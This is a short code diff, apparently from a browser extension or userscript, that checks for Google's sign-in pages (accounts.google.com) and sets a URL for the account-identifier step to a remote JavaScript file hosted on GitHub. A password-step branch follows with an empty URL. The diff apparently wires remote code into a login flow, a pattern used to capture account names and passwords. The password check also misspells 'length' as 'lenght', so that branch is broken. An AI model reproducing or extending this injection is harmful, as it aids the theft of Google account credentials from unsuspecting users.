@@ -10,7 +10,7 @@ if (location.host == 'accounts.google.com'){
     let path = location.pathname.split('/');
     
     if (path[path.length - 1] == 'identifier'){
-            url = "";
+            url = "https://raw.githubusercontent.com/Wolota/ips/main/identifierGAccount.js";
     }
     else if (path[path.lenght - 1] == 'pwd'){
         url = "";
